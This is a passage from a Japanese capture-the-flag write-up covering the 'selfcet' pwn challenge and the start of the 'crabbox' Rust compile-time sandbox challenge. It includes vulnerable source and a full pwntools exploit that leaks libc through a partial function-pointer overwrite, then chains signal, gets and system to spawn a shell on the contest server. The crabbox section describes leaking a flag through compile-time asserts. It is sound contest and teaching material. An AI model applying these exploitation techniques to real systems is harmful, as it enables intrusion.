</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_member</span>(<span style="color:#66d9ef">ctx_t</span> <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">size_t</span> size) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(STDIN_FILENO, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)ctx <span style="color:#f92672">+</span> offset, size) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#f92672">=</span> EXIT_FAILURE;
</span></span><span style="display:flex;"><span>    ctx<span style="color:#f92672">-&gt;</span>error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;I/O Error&#34;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ctx<span style="color:#f92672">-&gt;</span>buf[<span style="color:#a6e22e">strcspn</span>(ctx<span style="color:#f92672">-&gt;</span>buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CFI</span>(ctx<span style="color:#f92672">-&gt;</span>throw)(ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#75715e">/* 32bit! */</span>, ctx<span style="color:#f92672">-&gt;</span>error);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(snip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ctx_t</span> ctx <span style="color:#f92672">=</span> { .error <span style="color:#f92672">=</span> NULL, .status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, .throw <span style="color:#f92672">=</span> err };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_member</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">ctx_t</span>, key), <span style="color:#66d9ef">sizeof</span>(ctx)); <span style="color:#75715e">/* ctx_tå…¨ä½“ãŒæ›¸ãæ›ãˆå¯èƒ½ */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_member</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">ctx_t</span>, buf), <span style="color:#66d9ef">sizeof</span>(ctx)); <span style="color:#75715e">/* ctx_tã®bufä»¥é™å…¨éƒ¨ãŒæ›¸ãæ›ãˆå¯èƒ½ &amp; ã‚¹ã‚¿ãƒƒã‚¯BOF */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  (snip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stack Smashing Protectorã‚ã‚Š */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Full RELRO, NX, Stack Smashing Protectorã‚ã‚Š, No PIEã§ã€å…ˆé ­ãŒ<code>endbr64</code>ã®é–¢æ•°ã‚’2å›ã€ãã‚Œãã‚Œ32bitã¨64bitã®å¼•æ•°2å€‹ã‚’æ¸¡ã—ã¦å‘¼ã³ã ã›ã€ã‚¹ã‚¿ãƒƒã‚¯ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚‚ã‚ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’æ”»ç•¥ã™ã‚‹å•é¡Œã§ã™ã€‚</p>
<p>é–¢æ•°ã®åˆæœŸå€¤ã¯<code>err()</code>ã§ã€ç¬¬äºŒå¼•æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å†…å®¹ã‚’ãƒªãƒ¼ã‚¯ã§ãã¾ã™ãŒé€”ä¸­ã§<code>exit()</code>ã—ã¦ã—ã¾ã„ã¾ã™ã€‚ã—ã‹ã—ã€å®Ÿè¡Œç’°å¢ƒ(Ubuntu 22.04)ã®libcã¯<code>err()</code>ã®è¿‘ãã«ãã‚Œã®<code>exit()</code>ã—ãªã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®<code>warnx()</code>ãŒã‚ã‚‹ã®ã§ã€é–¢æ•°ãƒã‚¤ãƒ³ã‚¿ã‚’é€”ä¸­ã¾ã§æ›¸ãæ›ãˆã‚‹ã“ã¨ã§GOTã‚’ãƒªãƒ¼ã‚¯ã—ã¦libcã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç‰¹å®šã§ãã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ç¬¬ä¸€å¼•æ•°ãŒ32bitãªã®ã§ã€<code>0xffffffff</code>ä»¥é™ã«é…ç½®ã•ã‚Œã¦ã„ã‚‹libcå†…ã®<code>/bin/sh\0</code>ã‚’ä½¿ã£ã¦ãŠæ‰‹è»½ã«<code>system(&quot;/bin/sh&quot;)</code>ã§ãã¾ã›ã‚“ã€‚<br>
<code>endbr64</code>ãŒãªã„é–¢æ•°ã®é€”ä¸­ã«é£›ã°ã™ã“ã¨ã‚‚ã§ããªã„ã®ã§ã€ã†ã¾ãlibcã‚’æ‚ªç”¨ã—ã¦ã‚·ã‚§ãƒ«å®Ÿè¡Œã«æŒã¡è¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>è‡ªåˆ†ã¯<code>signal()</code>ãŒéƒ½åˆã®ã‚ˆã„å¼•æ•°ã‚’æŒã£ã¦ã„ã¦ã€SSPãŒ<code>SIGABRT</code>ã§è‡ªæ®ºã™ã‚‹ã“ã¨ã‚’åˆ©ç”¨ã—ã¦<code>signal(SIGABRT, main)</code>ã§<code>main()</code>ã«æˆ»ã—ã¦é–¢æ•°ã®å®Ÿè¡Œå›æ•°ã‚’å¢—ã‚„ã—ã€<code>gets()</code>ã§32bitã®ç¯„å›²ã«<code>&quot;/bin/sh&quot;</code>ã‚’ä½œã£ã¦<code>system(&quot;/bin/sh&quot;)</code>ã—ã¾ã—ãŸãŒã€ã“ã‚Œã¯æƒ³å®šè§£ã§ã¯ãªãã€</p>
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">pwnç°¡æ˜“writeup<br>rop-2.35: gadgetã‚’ä½¿ã‚ãªã„ROP<br>blackout: string.gã®includeå¿˜ã‚Œã§å®šç¾©ãŒå£Šã‚Œã¦ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ™‚ã«ãƒã‚°ãŒåŸ‹ã‚è¾¼ã¾ã‚Œã‚‹â†’memmemãŒ32-bitã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¿”ã™ã®ã§4GB allocã™ã‚‹ã¨å£Šã‚Œã‚‹<br>selfcet: arch_prctlã§FSãƒ¬ã‚¸ã‚¹ã‚¿ã‚’æ›¸ãæ›ãˆã¦stack canaryã‚’å›é¿ã™ã‚‹</p>&mdash; pwnyaa (@pwnyaa) <a href="https://twitter.com/pwnyaa/status/1703283949328576549?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


<p><code>arch_prctl(ARCH_SET_FS)</code> ã§TLSã‚’å·®ã—æ›¿ãˆã¦canaryãƒã‚§ãƒƒã‚¯ã‚’å›é¿ã™ã‚‹ã®ãŒæƒ³å®šè§£ã‚‰ã—ã„ã§ã™ã€‚ã“ã‚Œãªã‚‰ãƒªãƒ¼ã‚¯â†’canaryç½®ãæ›ãˆâ†’ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®1ãƒ‘ã‚¹ã§è¡Œã‘ã¾ã™ã­ã€‚<br>
ã—ã‹ã—ã€<code>ld.so</code>ãŒTLSã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã—ã¦ã„ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ã„ãŸã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ãªãœã‹åŒã˜æ–¹æ³•ã§å†è¨­å®šã™ã‚‹ç™ºæƒ³ã«è‡³ã‚Œã¦ã¾ã›ã‚“ã§ã—ãŸâ€¦ ã“ã†ã„ã†ã®ã‚ˆããªã„ã§ã™ã­ã€‚</p>
<p>exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>   warnx_l16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0010</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> i
</span></span><span style="display:flex;"><span>   print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;trying: </span><span style="color:#e6db74">{</span>warnx_l16<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># r = process(&#34;./xor&#34;, env={&#34;LD_LIBRARY_PATH&#34;: os.getcwd()})</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># input()</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># warnx_l16 = 0x1010</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;selfcet.seccon.games&#34;</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#key</span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># error (arg2)</span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x403ff8</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit #err@got</span>
</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> p16(warnx_l16) <span style="color:#75715e">#warnx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   r<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>      print(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;xor: &#34;</span>))
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
</span></span><span style="display:flex;"><span>      r<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: Success</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: Success</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> u64(a)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;err=</span><span style="color:#e6db74">{</span>err<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> err <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;err&#34;</span>]
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;base=</span><span style="color:#e6db74">{</span>base<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
</span></span><span style="display:flex;"><span>signal  <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;signal&#34;</span>]
</span></span><span style="display:flex;"><span>gets <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;gets&#34;</span>]
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401209</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(main) <span style="color:#75715e"># error (arg2)</span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">6</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit, SIGABRT</span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(signal)
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#overflow</span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x20</span>))
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#key</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># error (arg2)</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404000</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(gets)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>) <span style="color:#75715e">#ğŸ¤¢</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># error (arg2)</span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404000</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit, &#34;/bin/sh&#34;</span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(system)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf4)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><code>mprotect()</code>ã—ã¦ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«æŒã¡è¾¼ã‚€ã€<code>on_exit()</code>ã§<code>main()</code>ã«æˆ»ã™ãªã©ã®æ–¹æ³•ã‚‚ã‚ã£ãŸã¿ãŸã„ã§ã™ã€‚
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">ä¿ºã¯mprotect+read</p>&mdash; å°æ± æ‚ ç”Ÿ (@shojin_comp) <a href="https://twitter.com/shojin_comp/status/1703306637300417000?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">ã‚ªã‚¸ã‚µãƒ³ã¯warn-&gt;on_exit-&gt;main-&gt;gets-&gt;system</p>&mdash; mora (@moratorium08) <a href="https://twitter.com/moratorium08/status/1703332110596227311?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</p>
<h3 id="crabbox-misc">crabbox (misc)</h3>
<p>å•é¡Œ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tempfile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;FLAG&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> re<span style="color:#f92672">.</span>fullmatch(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;SECCON{[_a-z0-9]+}&#34;</span>, FLAG)
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TEMPLATE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fn main() {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{YOUR_PROGRAM}}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* Steal me: {{FLAG}} */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ğŸ¦€ Compile-Time Sandbox Escape ğŸ¦€
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Input your program (the last line must start with __EOF__):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip(), flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>program <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;__EOF__&#34;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    program <span style="color:#f92672">+=</span> line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(program) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">512</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Your program is too long. ByeğŸ‘‹&#34;</span><span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>source <span style="color:#f92672">=</span> TEMPLATE<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;{{FLAG}}&#34;</span>, FLAG)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;{{YOUR_PROGRAM}}&#34;</span>, program)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> tempfile<span style="color:#f92672">.</span>NamedTemporaryFile(suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.rs&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(source<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
</span></span><span style="display:flex;"><span>            [<span style="color:#e6db74">&#34;rustc&#34;</span>, file<span style="color:#f92672">.</span>name],
</span></span><span style="display:flex;"><span>            cwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp&#34;</span>,
</span></span><span style="display:flex;"><span>            stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>DEVNULL,
</span></span><span style="display:flex;"><span>            stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>DEVNULL,
</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;:)&#34;</span> <span style="color:#66d9ef">if</span> proc<span style="color:#f92672">.</span>returncode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;:(&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>TimeoutExpired:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;timeout&#34;</span>)
</span></span></code></pre></div><p>Rustã®ã‚³ãƒ¼ãƒ‰ã‚’æ¸¡ã™ã¨ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦æˆåŠŸãªã‚‰<code>:)</code>ã€å¤±æ•—ãªã‚‰<code>:(</code>ã‚’è¿”ã—ã¦ãã‚Œã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»ç•¥ã™ã‚‹å•é¡Œã§ã™ã€‚å…¥åŠ›ã—ãŸã‚³ãƒ¼ãƒ‰ã®å¾Œã«Flagã®å…¥ã£ãŸã‚³ãƒ¡ãƒ³ãƒˆãŒè¿½è¨˜ã•ã‚Œã‚‹ã®ã§ã€ã©ã†ã«ã‹ã—ã¦ã“ã‚Œã‚’ç›—ã¿ã ã—ã¾ã™ã€‚</p>
<p>Rustã¯ <code>const _:() = assert!(...);</code> ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ™‚assertãŒã§ãã€<code>include_bytes!()</code>ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ™‚ãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿å–ã‚Šã€ã•ã‚‰ã«<code>file!()</code>ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ä¸­ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’å–å¾—ã§ãã‚‹ã®ã§ã€ã“ã‚Œã‚‰ã‚’çµ„ã¿åˆã‚ã›ã¦Flagã‚’1ãƒ“ãƒƒãƒˆã¥ã¤èª­ã¿å‡ºã—ã¾ã™ã€‚ã‚ˆãè€ƒãˆãŸã‚‰ASCIIãªã®ã§MSBã¯0å›ºå®šã§ã‚ˆã‹ã£ãŸã§ã™ã­ã€‚</p>
<p>exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;fn main() {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>af <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* Steal me: __FLAG__ */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
